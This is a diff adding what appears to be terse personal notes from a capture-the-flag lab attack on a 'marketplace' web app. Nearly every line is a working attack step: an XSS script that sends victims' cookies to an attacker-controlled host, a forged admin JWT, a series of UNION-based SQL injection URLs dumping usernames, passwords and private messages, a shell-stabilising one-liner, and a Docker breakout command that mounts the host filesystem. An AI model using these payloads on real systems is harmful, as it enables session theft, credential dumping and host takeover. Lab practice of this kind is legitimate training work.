@@ -1,0 +1,16 @@
+<script>var i=new Image;i.src="http://10.11.67.208:8888/?"+document.cookie;</script>
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NTY1OTIxMDR9.r2e0JTIE_D4hTqiS0l2zgeylNBnpXUvzBUOSexsdjVY
+http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,database(),3,4
+http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,group_concat(table_name),3,4%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27marketplace%27
+http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,group_concat(column_name),3,4%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27users%27
+http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,group_concat(username,%22:%22,password,%20%22:%22,%20isAdministrator,%20%22\n%22),3,4%20FROM%20users
+
+Unable to crack hashes --> go to 
+http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,group_concat(table_name),3,4%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27marketplace%27
+http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,group_concat(column_name),3,4%20FROM%20information_schema.columns%20WHERE%20table_name=%20%27messages%27
+http://10.10.189.139/admin?user=0%20UNION%20SELECT%201,group_concat(id,%20%27:%27,user_from,%20%27:%27,user_to,%20%27:%27,message_content,%20%27:%27,is_read,%20%27:%27,%20%27\n%27%20),3,4%20FROM%20messages
+
+move to michael via tar 
+stabilize shell (python -c 'import pty;pty.spawn("/bin/bash")')
+id
+break out of docker (docker run -v /:/mnt --rm -it alpine chroot /mnt sh)
